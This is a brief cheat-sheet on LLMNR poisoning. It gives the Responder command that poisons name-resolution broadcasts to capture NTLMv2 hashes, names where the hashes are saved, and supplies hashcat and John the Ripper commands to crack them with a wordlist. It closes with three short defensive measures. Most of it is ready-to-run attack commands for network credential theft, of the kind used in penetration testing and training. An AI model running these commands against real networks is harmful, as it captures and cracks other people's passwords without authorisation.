# LLMNR Poisoning

Capture NTLMv2 hashes when DNS fails and system broadcasts LLMNR queries.

## Attack
```bash
$ sudo responder -I eth0 -dvPv
```

Hashes saved: `/root/.responder/logs/`

## Crack Hashes
```bash
$ hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
$ john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt
```

## Defense
- Disable LLMNR & NBT-NS
- Require SMB signing
- Network segmentation

